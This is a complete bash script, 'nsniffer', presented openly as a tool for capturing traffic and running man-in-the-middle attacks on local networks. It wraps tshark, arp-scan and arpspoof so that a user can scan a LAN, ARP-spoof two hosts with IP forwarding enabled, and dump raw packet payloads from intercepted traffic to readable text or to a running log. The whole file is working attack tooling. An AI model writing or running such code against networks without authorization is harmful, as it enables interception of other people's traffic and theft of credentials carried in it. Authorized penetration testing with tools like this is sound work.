#!/usr/bin/env bash
# ==============================================================================
# nsniffer - Tool for capturing, analyzing, and performing MITM attacks on local networks
#
# Examples:
#   nsniffer capture -i eth0 -o output.pcap -f "tcp" [--live]
#   nsniffer analyze output.pcap
#   nsniffer mitm eth0 192.168.0.1 192.168.0.2
#   nsniffer arp eth0 192.168.0.1 192.168.0.2
#   nsniffer scan eth0
#   nsniffer list
#   nsniffer extract file.pcap
#   nsniffer log eth0 capture.log
#   nsniffer setup
#   nsniffer help
# ==============================================================================
set -euo pipefail
IFS=$'\n\t'

# ------------------------------------------------------------------------------
# Colors and symbols
# ------------------------------------------------------------------------------
setup_colors() {
  redColor="\e[0;31m"
  greenColor="\e[0;32m"
  yellowColor="\e[0;33m"
  blueColor="\e[0;34m"
  purpleColor="\e[0;35m"
  cyanColor="\e[0;36m"
  resetColor="\e[0m"

  plus="${greenColor}[+] ${resetColor}"
  error="${redColor}[x] ${resetColor}"
  warning="${yellowColor}[!] ${resetColor}"
  question="${purpleColor}[?] ${resetColor}"
  double_colon="${cyanColor}:: ${resetColor}"
}

print_with_color() {
  local color="$1"
  local message="$2"
  echo -e "${color}${message}${resetColor}"
}

setup_colors

# ------------------------------------------------------------------------------
# Help function
# ------------------------------------------------------------------------------
print_help() {
  cat <<EOF
Usage: nsniffer <subcommand> [options]

Subcommands:
  capture    Capture traffic with TShark.
             Ex: nsniffer capture -i eth0 -o file.pcap -f "tcp" --live

  analyze    Analyze a pcap file.
             Ex: nsniffer analyze file.pcap

  mitm       Man-in-the-Middle attack with ARP spoofing (requires IP forwarding).
             Ex: nsniffer mitm eth0 192.168.0.1 192.168.0.2

  arp        ARP spoofing for a single target.
             Ex: nsniffer arp eth0 192.168.0.1 192.168.0.2

  scan       Scan the local network for devices.
             Ex: nsniffer scan eth0

  list       List available network interfaces.

  extract    Extract hexadecimal data in readable text from a pcap file.
             Ex: nsniffer extract file.pcap

  log        Capture traffic at intervals and save extracted data to a log.
             Ex: nsniffer log eth0 capture.log

  setup      Install (or attempt to install) necessary dependencies:
             tshark, arpspoof, arp-scan

  help       Show this help message.
EOF
}

# ------------------------------------------------------------------------------
# Unified dependency check/installation
# ------------------------------------------------------------------------------
check_or_install_dependencies() {
  if [[ -f /etc/debian_version ]]; then
    apt-get update -qq
    PKG_INSTALL="apt-get install -y"
  elif [[ -f /etc/redhat-release ]]; then
    yum install -y epel-release
    PKG_INSTALL="yum install -y"
  elif [[ -f /etc/arch-release ]]; then
    pacman -Sy --noconfirm
    PKG_INSTALL="pacman -S --noconfirm"
  else
    echo "Unsupported distro. Please install dependencies manually."
    exit 1
  fi

  local -a deps=("tshark" "arpspoof" "arp-scan")
  local -a to_install=()

  for cmd in "${deps[@]}"; do
    if ! command -v "$cmd" &>/dev/null; then
      case "$cmd" in
        arpspoof) to_install+=("dsniff") ;;
        tshark)
          if [[ -f /etc/arch-release ]]; then
            to_install+=("wireshark-cli")
          else
            to_install+=("tshark")
          fi
          ;;
        arp-scan) to_install+=("arp-scan") ;;
      esac
    fi
  done

  if [[ ${#to_install[@]} -eq 0 ]]; then
    echo "All dependencies are already installed."
  else
    eval "$PKG_INSTALL ${to_install[*]}"
    echo "Installed: ${to_install[*]}"
  fi
}

# ------------------------------------------------------------------------------
# Subcommand: setup
# ------------------------------------------------------------------------------
setup_environment() {
  print_with_color "$double_colon" "Installing/verifying dependencies..."
  check_or_install_dependencies
}

# ------------------------------------------------------------------------------
# List network interfaces
# ------------------------------------------------------------------------------
list_interfaces() {
  print_with_color "$double_colon" "Available network interfaces:"
  ip -o link show | awk -F': ' '{print $2}' | grep -v "lo"
}

# ------------------------------------------------------------------------------
# Subcommand: scan (ARP scan)
# ------------------------------------------------------------------------------
scan_network() {
  local interface="${1:-}"
  [ -z "$interface" ] && {
    print_with_color "\n$warning" "Interface missing. Use the 'list' subcommand to see available interfaces."
    return 1
  }
  print_with_color "$double_colon" "Scanning network devices on $interface..."
  arp-scan --interface "$interface" --localnet
}

# ------------------------------------------------------------------------------
# Validate that an interface exists
# ------------------------------------------------------------------------------
validate_interface() {
  local iface="$1"
  if [[ -z "$iface" ]]; then
    print_with_color "$error" "You must specify a network interface."
    exit 1
  fi
}

# ------------------------------------------------------------------------------
# Subcommand: capture (traffic capture)
# ------------------------------------------------------------------------------
capture_traffic() {
  local interface=""
  local output_file="output.pcap"
  local filter=""
  local live_mode=false

  # Capture-specific flags
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -i|--interface)
        interface="$2"
        shift 2
        ;;
      -o|--output)
        output_file="$2"
        shift 2
        ;;
      -f|--filter)
        filter="$2"
        shift 2
        ;;
      -live|--live)
        live_mode=true
        shift
        ;;
      *)
        print_with_color "$warning" "Unknown option for 'capture': $1"
        exit 1
        ;;
    esac
  done

  validate_interface "$interface"
  print_with_color "$blueColor" "Starting capture on $interface with filter: ${filter:-<no filter>}"

  if $live_mode; then
    tshark -i "$interface" ${filter:+-f "$filter"} -w "$output_file" -x || {
      print_with_color "$error" "Error capturing in live mode."
      exit 1
    }
  else
    tshark -i "$interface" ${filter:+-f "$filter"} -w "$output_file" || {
      print_with_color "$error" "Error capturing."
      exit 1
    }
  fi

  print_with_color "$plus" "Capture finished. File saved to: $output_file"
}

# ------------------------------------------------------------------------------
# Subcommand: analyze (analyze a pcap)
# ------------------------------------------------------------------------------
analyze_traffic() {
  if [[ $# -lt 1 ]]; then
    print_with_color "$error" "You must specify a pcap file to analyze."
    exit 1
  fi

  local pcap_file="$1"

  if [ ! -s "$pcap_file" ]; then
    print_with_color "$error" "File '$pcap_file' is empty or does not exist."
    exit 1
  fi

  print_with_color "$blueColor" "Analyzing $pcap_file:"
  tshark -r "$pcap_file" -T text
}

# ------------------------------------------------------------------------------
# ARP Spoofing (subcommand: arp)
# ------------------------------------------------------------------------------
start_arpspoof() {
  local interface="$1"
  local target="$2"
  local victim="$3"

  print_with_color "$double_colon" "Starting ARP spoofing: Target=$target, Victim=$victim"
  arpspoof -i "$interface" -t "$target" "$victim" &
  echo $!  # Return PID
}

# ------------------------------------------------------------------------------
# Interrupt handler (cleans processes and IP forwarding)
# ------------------------------------------------------------------------------
handle_interrupt() {
  local pids=("$@")  # Receive all PIDs to terminate
  print_with_color "$warning" "Interrupt detected. Cleaning up..."
  for pid in "${pids[@]}"; do
    kill "$pid" 2>/dev/null || true
  done
  # Disable IP forwarding
  echo 0 > /proc/sys/net/ipv4/ip_forward
  exit 0
}

# ------------------------------------------------------------------------------
# Subcommand: arp (one victim or one target)
# ------------------------------------------------------------------------------
arp_spoof_single() {
  if [[ $# -lt 3 ]]; then
    print_with_color "$error" "Usage: nsniffer arp <interface> <target1> <target2>"
    exit 1
  fi

  local interface="$1"
  local target1="$2"
  local target2="$3"
  validate_interface "$interface"

  # Start arpspoof and wait
  pid=$(start_arpspoof "$interface" "$target1" "$target2")
  trap "handle_interrupt $pid" SIGINT
  wait
}

# ------------------------------------------------------------------------------
# Subcommand: mitm (two targets)
# ------------------------------------------------------------------------------
arpspoof_mitm() {
  if [[ $# -lt 3 ]]; then
    print_with_color "$error" "Usage: nsniffer mitm <interface> <target1> <target2>"
    exit 1
  fi

  local interface="$1"
  local target1="$2"
  local target2="$3"
  validate_interface "$interface"

  print_with_color "$double_colon" "Enabling IP forwarding for MITM..."
  echo 1 > /proc/sys/net/ipv4/ip_forward

  local pid1 pid2
  pid1=$(start_arpspoof "$interface" "$target1" "$target2")
  pid2=$(start_arpspoof "$interface" "$target2" "$target1")

  trap "handle_interrupt $pid1 $pid2" SIGINT
  wait
}

# ------------------------------------------------------------------------------
# Subcommand: extract (hex data extraction)
# ------------------------------------------------------------------------------
extract_pcap() {
  if [[ $# -lt 1 ]]; then
    print_with_color "$error" "You must specify a pcap file to extract data from."
    exit 1
  fi

  local file="$1"
  if [ ! -f "$file" ]; then
    print_with_color "$error" "Pcap file '$file' does not exist."
    exit 1
  fi

  print_with_color "$blueColor" "Extracting data from $file:"
  tshark -r "$file" -Y "frame.len > 100" -T fields -e data | while read -r line; do
    [ -n "$line" ] && echo "$line" | xxd -r -p
  done
}

# ------------------------------------------------------------------------------
# Subcommand: log (capture and record data at intervals)
# ------------------------------------------------------------------------------
extract_and_append() {
  local pcap_file="$1"
  local log_file="$2"

  print_with_color "$greenColor" "Extracting data from: $pcap_file"
  echo -e "\n--- Capture started at $(date '+%Y-%m-%d %H:%M:%S') ---\n" >> "$log_file"

  tshark -r "$pcap_file" -T fields -e data | while read -r line; do
    [ -n "$line" ] && echo "$line" | xxd -r -p >> "$log_file"
  done

  echo -e "\n--- Capture ended at $(date '+%Y-%m-%d %H:%M:%S') ---\n" >> "$log_file"
  print_with_color "$plus" "Data appended to log: $log_file"
}

capture_and_log() {
  local interface="$1"
  local log_file="$2"
  local interval="${3:-5}"
  local output_file="${log_file}.pcap"

  print_with_color "$greenColor" "Starting capture on $interface (interval=${interval}s)."

  while true; do
    # Start tshark
    tshark -i "$interface" -w "$output_file" >/dev/null 2>&1 &
    local tshark_pid=$!

    # Wait for the interval
    sleep "$interval"
    kill "$tshark_pid" 2>/dev/null || true

    extract_and_append "$output_file" "$log_file"
    print_with_color "$cyanColor" "Press Enter to continue or Ctrl+C to exit."
    read -r
  done
}

log_traffic() {
  if [[ $# -lt 2 ]]; then
    print_with_color "$error" "Usage: nsniffer log <interface> <log_file> [interval]"
    exit 1
  fi

  local interface="$1"
  local log_file="$2"
  local interval="${3:-5}"
  validate_interface "$interface"

  capture_and_log "$interface" "$log_file" "$interval"
}

# ------------------------------------------------------------------------------
# MAIN (subcommands)
# ------------------------------------------------------------------------------
main() {
  # Ensure the script is run as root
  if [[ "$(id -u)" -ne 0 ]]; then
    print_with_color "$error" "This script must be run as root."
    exit 1
  fi

  # Check the first argument (subcommand)
  local subcommand="${1:-}"
  if [[ -z "$subcommand" ]]; then
    print_help
    exit 0
  fi
  shift

  # Interpret subcommand
  case "$subcommand" in
    help|-h|--help)
      print_help
      ;;
    setup)
      setup_environment
      ;;
    list)
      list_interfaces
      ;;
    scan)
      scan_network "$@"
      ;;
    capture)
      capture_traffic "$@"
      ;;
    analyze)
      analyze_traffic "$@"
      ;;
    arp)
      arp_spoof_single "$@"
      ;;
    mitm)
      arpspoof_mitm "$@"
      ;;
    extract)
      extract_pcap "$@"
      ;;
    log)
      log_traffic "$@"
      ;;
    *)
      print_with_color "$warning" "Unknown subcommand: $subcommand"
      print_help
      exit 1
      ;;
  esac
}

main "$@"
